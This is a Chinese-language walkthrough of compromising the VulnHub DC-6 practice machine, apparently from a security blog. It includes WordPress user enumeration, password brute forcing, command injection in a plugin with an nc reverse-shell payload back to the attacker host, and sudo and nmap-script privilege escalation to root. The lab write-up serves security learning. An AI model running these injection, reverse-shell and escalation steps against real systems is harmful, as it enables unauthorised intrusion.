@@ -1,0 +1,671 @@
+---
+title: "VulnHub-DC6"
+layout: post
+date: 2021-12-19 21:34
+image: 
+headerImage: false
+tag:
+- web
+- vulnhub
+category: blog
+author: NoThxJ
+description: VulnHub
+---
+
+环境下载地址：
+
+<https://www.five86.com/dc-6.html>
+
+环境搭建：
+
+![1](https://havocykp.github.io/assets/images/img_blog8/1.png)
+
+信息收集
+
+探测目标IP
+
+命令：netdiscover -r 192.168.2.0/24
+
+![2](https://havocykp.github.io/assets/images/img_blog8/2.png)
+
+```javascript
+┌─[✗]─[root@pendo]─[~]
+└──╼ #nmap -sT 192.168.2.0/24
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-10 00:52 CST
+Nmap scan report for phicomm.me (192.168.2.1)
+Host is up (0.0023s latency).
+Not shown: 996 closed ports
+PORT     STATE SERVICE
+53/tcp   open  domain
+80/tcp   open  http
+5000/tcp open  upnp
+8080/tcp open  http-proxy
+MAC Address: 68:DB:54:C4:95:F0 (Phicomm (Shanghai))
+
+Nmap scan report for 192.168.2.193
+Host is up (0.0020s latency).
+Not shown: 998 closed ports
+PORT      STATE SERVICE
+80/tcp    open  http
+49154/tcp open  unknown
+MAC Address: F8:FF:C2:44:6B:5C (Apple)
+
+Nmap scan report for dc-6.lan (192.168.2.203)
+Host is up (0.026s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:92:C3:BA (Oracle VirtualBox virtual NIC)
+
+Nmap scan report for pendo.lan (192.168.2.110)
+Host is up (0.024s latency).
+All 1000 scanned ports on pendo.lan (192.168.2.110) are closed
+
+Nmap done: 256 IP addresses (4 hosts up) scanned in 40.37 seconds
+
+----------------------------------------------------------------------
+
+┌─[root@pendo]─[~]
+└──╼ #nmap -sP 192.168.2.0/24
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-10 00:53 CST
+Nmap scan report for phicomm.me (192.168.2.1)
+Host is up (0.0016s latency).
+MAC Address: 68:DB:54:C4:95:F0 (Phicomm (Shanghai))
+Nmap scan report for 192.168.2.193
+Host is up (0.00022s latency).
+MAC Address: F8:FF:C2:44:6B:5C (Apple)
+Nmap scan report for dc-6.lan (192.168.2.203)
+Host is up (0.00044s latency).
+MAC Address: 08:00:27:92:C3:BA (Oracle VirtualBox virtual NIC)
+Nmap scan report for pendo.lan (192.168.2.110)
+Host is up.
+Nmap done: 256 IP addresses (4 hosts up) scanned in 1.94 seconds
+```
+
+端口扫描
+
+```javascript
+┌─[root@pendo]─[~]
+└──╼ #nmap -sT -sV -A -T5 192.168.2.203 -p-
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-10 01:02 CST
+Warning: 192.168.2.203 giving up on port because retransmission cap hit (2).
+Nmap scan report for dc-6.lan (192.168.2.203)
+Host is up (0.0050s latency).
+Not shown: 51016 closed ports, 14517 filtered ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)
+|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)
+|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Did not follow redirect to http://wordy/
+MAC Address: 08:00:27:92:C3:BA (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   4.96 ms dc-6.lan (192.168.2.203)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 64.41 seconds
+
+```
+
+host文件设置
+
+/etc/hosts（Mac 、Parrot操作系统hosts文件位置）
+
+![3](https://havocykp.github.io/assets/images/img_blog8/3.png)
+
+开放80端口，访问：<http://192.168.2.203>
+
+![4](https://havocykp.github.io/assets/images/img_blog8/4.png)
+
+插件识别出是一个 wordpress模板的博客网站
+
+![5](https://havocykp.github.io/assets/images/img_blog8/5.png)
+
+扫描目录
+
+```javascript
+┌─[root@pendo]─[~]
+└──╼ #dirb http://192.168.2.203
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Fri Sep 10 01:32:16 2021
+URL_BASE: http://192.168.2.203/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://192.168.2.203/ ----
++ http://192.168.2.203/index.php (CODE:200|SIZE:53227)                         
++ http://192.168.2.203/server-status (CODE:403|SIZE:301)                       
+==> DIRECTORY: http://192.168.2.203/wp-admin/                                  
+==> DIRECTORY: http://192.168.2.203/wp-content/                                
+==> DIRECTORY: http://192.168.2.203/wp-includes/                               
++ http://192.168.2.203/xmlrpc.php (CODE:405|SIZE:42)                           
+                                                                               
+---- Entering directory: http://192.168.2.203/wp-admin/ ----
++ http://192.168.2.203/wp-admin/admin.php (CODE:302|SIZE:0)                    
+==> DIRECTORY: http://192.168.2.203/wp-admin/css/                              
+==> DIRECTORY: http://192.168.2.203/wp-admin/images/                           
+==> DIRECTORY: http://192.168.2.203/wp-admin/includes/                         
++ http://192.168.2.203/wp-admin/index.php (CODE:302|SIZE:0)                    
+==> DIRECTORY: http://192.168.2.203/wp-admin/js/                               
+==> DIRECTORY: http://192.168.2.203/wp-admin/maint/                            
+==> DIRECTORY: http://192.168.2.203/wp-admin/network/                          
+==> DIRECTORY: http://192.168.2.203/wp-admin/user/                             
+                                                                               
+---- Entering directory: http://192.168.2.203/wp-content/ ----
++ http://192.168.2.203/wp-content/index.php (CODE:200|SIZE:0)                  
+==> DIRECTORY: http://192.168.2.203/wp-content/plugins/                        
+==> DIRECTORY: http://192.168.2.203/wp-content/themes/                         
+                                                                               
+---- Entering directory: http://192.168.2.203/wp-includes/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://192.168.2.203/wp-admin/css/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://192.168.2.203/wp-admin/images/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://192.168.2.203/wp-admin/includes/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://192.168.2.203/wp-admin/js/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://192.168.2.203/wp-admin/maint/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+---- Entering directory: http://192.168.2.203/wp-admin/network/ ----
++ http://192.168.2.203/wp-admin/network/admin.php (CODE:302|SIZE:0)            
++ http://192.168.2.203/wp-admin/network/index.php (CODE:302|SIZE:0)            
+                                                                               
+---- Entering directory: http://192.168.2.203/wp-admin/user/ ----
++ http://192.168.2.203/wp-admin/user/admin.php (CODE:302|SIZE:0)               
++ http://192.168.2.203/wp-admin/user/index.php (CODE:302|SIZE:0)               
+                                                                               
+---- Entering directory: http://192.168.2.203/wp-content/plugins/ ----
++ http://192.168.2.203/wp-content/plugins/index.php (CODE:200|SIZE:0)          
+                                                                               
+---- Entering directory: http://192.168.2.203/wp-content/themes/ ----
++ http://192.168.2.203/wp-content/themes/index.php (CODE:200|SIZE:0)           
+                                                                               
+-----------------
+END_TIME: Fri Sep 10 01:32:55 2021
+DOWNLOADED: 32284 - FOUND: 12
+
+```
+
+扫描网站结构
+
+命令：nikto -h wordy -o nikto-wordy.txt  // 扫描并将结果写入文件
+
+```javascript
+┌─[root@pendo]─[~]
+└──╼ #nikto -h wordy -o nikto-wordy.txt
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.203
++ Target Hostname:    wordy
++ Target Port:        80
++ Start Time:         2021-09-10 01:35:06 (GMT8)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.25 (Debian)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ Uncommon header 'link' found, with multiple values: (<http://wordy/index.php/wp-json/>; rel="https://api.w.org/",<http://wordy/>; rel=shortlink,)
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Uncommon header 'x-redirect-by' found, with contents: WordPress
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Apache/2.4.25 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ OSVDB-3233: /icons/README: Apache default file found.
++ /wp-links-opml.php: This WordPress script reveals the installed version.
++ OSVDB-3092: /license.txt: License file found may identify site software.
++ /: A Wordpress installation was found.
++ Cookie wordpress_test_cookie created without the httponly flag
++ /wp-login.php: Wordpress login found
++ 7681 requests: 0 error(s) and 13 item(s) reported on remote host
++ End Time:           2021-09-10 01:35:54 (GMT8) (48 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+```
+
+![6](https://havocykp.github.io/assets/images/img_blog8/6.png)
+
+打开后台登录页面
+
+![7](https://havocykp.github.io/assets/images/img_blog8/7.png)
+
+使用cewl生成密码，保存在当前目录
+
+命令：cewl http://wordy/ -w wordyPwd.txt
+
+![8](https://havocykp.github.io/assets/images/img_blog8/8.png)
+
+密码有了，还得获取用户名
+
+服务器搭建的是一个WordPress网站，所以可以想到用 wpscan扫描来枚举网站中的可用用户名
+
+获取用户名（wpscan），使用wpscan枚举该网站可用用户名
+
+```javascript
+┌─[root@pendo]─[/home/pendo]
+└──╼ #wpscan --url wordy -e u
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.17
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://wordy/ [192.168.2.203]
+[+] Started: Fri Sep 10 01:46:30 2021
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.25 (Debian)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://wordy/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://wordy/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://wordy/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.1.1 identified (Insecure, released on 2019-03-13).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://wordy/index.php/feed/, <generator>https://wordpress.org/?v=5.1.1</generator>
+ |  - http://wordy/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.1.1</generator>
+
+[+] WordPress theme in use: twentyseventeen
+ | Location: http://wordy/wp-content/themes/twentyseventeen/
+ | Last Updated: 2021-07-22T00:00:00.000Z
+ | Readme: http://wordy/wp-content/themes/twentyseventeen/README.txt
+ | [!] The version is out of date, the latest version is 2.8
+ | Style URL: http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1
+ | Style Name: Twenty Seventeen
+ | Style URI: https://wordpress.org/themes/twentyseventeen/
+ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 2.1 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1, Match: 'Version: 2.1'
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:00 <==> (10 / 10) 100.00% Time: 00:00:00
+
+[i] User(s) Identified:
+
+[+] admin
+ | Found By: Rss Generator (Passive Detection)
+ | Confirmed By:
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] jens
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] graham
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] mark
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] sarah
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Fri Sep 10 01:46:31 2021
+[+] Requests Done: 17
+[+] Cached Requests: 51
+[+] Data Sent: 4.429 KB
+[+] Data Received: 23.788 KB
+[+] Memory used: 160.844 MB
+[+] Elapsed time: 00:00:01
+
+```
+
+查看扫描结果，找到5个用户名：admin、graham、mark、sarah、jens
+
+![9](https://havocykp.github.io/assets/images/img_blog8/9.png)
+
+新建一个 .list文件，将扫描到的5个用户名加入该文件
+
+![10](https://havocykp.github.io/assets/images/img_blog8/10.png)
+
+结合cewl工具生成的字典文件进行爆破
+
+```javascript
+┌─[root@pendo]─[/home/pendo]
+└──╼ #wpscan --url http://wordy/ -U wordyUsers.list -P wordyPwd.txt 
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.17
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://wordy/ [192.168.2.203]
+[+] Started: Fri Sep 10 01:51:52 2021
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.25 (Debian)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://wordy/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://wordy/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://wordy/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.1.1 identified (Insecure, released on 2019-03-13).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://wordy/index.php/feed/, <generator>https://wordpress.org/?v=5.1.1</generator>
+ |  - http://wordy/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.1.1</generator>
+
+[+] WordPress theme in use: twentyseventeen
+ | Location: http://wordy/wp-content/themes/twentyseventeen/
+ | Last Updated: 2021-07-22T00:00:00.000Z
+ | Readme: http://wordy/wp-content/themes/twentyseventeen/README.txt
+ | [!] The version is out of date, the latest version is 2.8
+ | Style URL: http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1
+ | Style Name: Twenty Seventeen
+ | Style URI: https://wordpress.org/themes/twentyseventeen/
+ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 2.1 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://wordy/wp-content/themes/twentyseventeen/style.css?ver=5.1.1, Match: 'Version: 2.1'
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:00 <=> (137 / 137) 100.00% Time: 00:00:00
+
+[i] No Config Backups Found.
+
+[+] Performing password attack on Xmlrpc against 5 user/s
+Trying mark / here Time: 00:00:04 <=========> (445 / 445) 100.00% Time: 00:00:04
+
+[i] No Valid Passwords Found.
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Fri Sep 10 01:51:59 2021
+[+] Requests Done: 587
+[+] Cached Requests: 36
+[+] Data Sent: 257.394 KB
+[+] Data Received: 293.126 KB
+[+] Memory used: 239.949 MB
+[+] Elapsed time: 00:00:07
+
+```
+
+没有找到密码
+
+使用系统里的 rockyou.txt 字典
+
+![11](https://havocykp.github.io/assets/images/img_blog8/11.png)
+
+根据提示
+
+![12](https://havocykp.github.io/assets/images/img_blog8/12.png)
+
+根据提示将 rockyou.txt 的内容以 k01过滤后，输出到 wordy-pass.dic （作为新的字典）
+
+![13](https://havocykp.github.io/assets/images/img_blog8/13.png)
+
+再利用wpscan暴力破解
+
+```javascript
+┌─[root@pendo]─[/home/pendo]
+└──╼ #wpscan --url http://wordy/ -U wordyUsers.list -P wordy-pass.dic 
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.17
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://wordy/ [192.168.2.203]
+[+] Started: Fri Sep 10 02:00:23 2021
+
+[!] Valid Combinations Found:
+ | Username: mark, Password: helpdesk01
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Fri Sep 10 02:02:39 2021
+[+] Requests Done: 12718
+[+] Cached Requests: 7
+[+] Data Sent: 6.234 MB
+[+] Data Received: 7.735 MB
+[+] Memory used: 268.121 MB
+[+] Elapsed time: 00:02:15
+
+```
+
+爆破出密码：mark/helpdesk01
+
+通过爆破的账户和密码登录管理后台
+
+<http://wordy/wp-login.php>
+
+![14](https://havocykp.github.io/assets/images/img_blog8/14.png)
+
+发现用户及相应的权限
+
+![15](https://havocykp.github.io/assets/images/img_blog8/15.png)
+
+发现使用了 activity monitor 插件
+
+![16](https://havocykp.github.io/assets/images/img_blog8/16.png)
+
+查找activity monitor插件相关漏洞
+
+![17](https://havocykp.github.io/assets/images/img_blog8/17.png)
+
+查看 45274.html 内容
+
+描述：这个版本的插件存在 CSRF 和 反射型 XSS
+
+![18](https://havocykp.github.io/assets/images/img_blog8/18.png)
+
+根据描述，先用提供的代码尝试反弹shell
+
+![19](https://havocykp.github.io/assets/images/img_blog8/19.png)
+
+修改html文件，打开dc6.html，不能成功反弹shell
+
+![20](https://havocykp.github.io/assets/images/img_blog8/20.png)
+
+![21](https://havocykp.github.io/assets/images/img_blog8/21.png)
+
+![22](https://havocykp.github.io/assets/images/img_blog8/22.png)
+
+通过burpsuite抓包，测试能否成功反弹shell
+
+点击tools，输入框中输入任意字符测试，最后点击lookup按钮，进行抓包
+
+![23](https://havocykp.github.io/assets/images/img_blog8/23.png)
+
+![24](https://havocykp.github.io/assets/images/img_blog8/24.png)
+
+将该流量导入到 repeater 中，将 1234 改掉，用浏览器去访问它，我这里使用的是127.0.0.1，访问whoami，查看其权限
+
+![25](https://havocykp.github.io/assets/images/img_blog8/25.png)
+
+结果返回了 www-data，说明确实存在漏洞
+
+尝试用 nc 命令进行反弹
+
+① 用 攻击机进行监听
+
+nc -lvvp 9999
+
+![26](https://havocykp.github.io/assets/images/img_blog8/26.png)
+
+② 修改抓包的源码
+
+127.0.0.1|nc 192.168.2.110 9999 -e /bin/bash
+
+反弹shell成功，成功拿下shell
+
+![27](https://havocykp.github.io/assets/images/img_blog8/27.png)
+
+③ 通过python命令进入交互式模式
+
+命令：python -c 'import pty;pty.spawn("/bin/bash")'
+
+![28](https://havocykp.github.io/assets/images/img_blog8/28.png)
+
+在 /home/mark/stuff/things-to-do.txt 下，找到 graham的密码
+
+![29](https://havocykp.github.io/assets/images/img_blog8/29.png)
+
+获取账号密码
+
+graham：GSo7isUM1D4
+
+使用该账号密码登陆 SSH
+
+![30](https://havocykp.github.io/assets/images/img_blog8/30.png)
+
+
+
+提权
+
+在jens的用户目录下发现shell脚本，并且脚本可执行（backups.sh）
+
+![31](https://havocykp.github.io/assets/images/img_blog8/31.png)
+
+此脚本在当前用户下有读写权限，修改脚本内容，在末尾增加 /bin/bash，当执行时可以获得 jens的shell
+
+echo '/bin/bash' >> backups.sh
+
+sudo -u jens ./backups.sh
+
+成功切换到 jens 用户
+
+![32](https://havocykp.github.io/assets/images/img_blog8/32.png)
+
+查看jens可以使用的root权限命令，发现nmap有执行脚本的功能，通过编写特殊脚本，可以实现利用nmap提权
+
+![33](https://havocykp.github.io/assets/images/img_blog8/33.png)
+
+编写特殊脚本，获取flag
+
+echo 'os.execute("/bin/sh")' >get_root.nse
+
+sudo nmap --script=/home/jens/get_root.nse
+
+![34](https://havocykp.github.io/assets/images/img_blog8/34.png)
+
+直接输入命令即可即可查看
+
+进入 /root 目录，得到 theflag.txt
+
+![35](https://havocykp.github.io/assets/images/img_blog8/35.png)
+
